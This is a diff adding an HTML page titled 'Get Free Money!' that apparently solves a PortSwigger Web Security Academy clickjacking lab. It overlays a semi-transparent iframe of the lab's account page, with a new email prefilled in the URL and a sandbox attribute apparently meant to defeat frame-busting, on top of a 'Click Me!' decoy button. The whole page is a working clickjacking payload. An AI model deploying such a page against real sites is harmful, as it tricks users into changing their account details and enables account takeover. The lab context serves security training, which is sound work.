@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get Free Money!</title>
+    <style>
+        #target_site {
+            position: relative;
+            opacity: 0.5;
+            height: 600px;
+            width: 700px;
+            z-index: 2;
+        }
+
+        #decoy_site {
+            position: absolute;
+            top: 455px;
+            left: 50px;
+            z-index: 1;
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <button id="decoy_site">Click Me!</button>
+    </div>
+    <iframe id="target_site" sandbox="allow-forms" src="https://[LAB_SUB_DOMAIN].web-security-academy.net/my-account?email=wiener2@normal-user.net"></iframe>
+</body>
+</html>
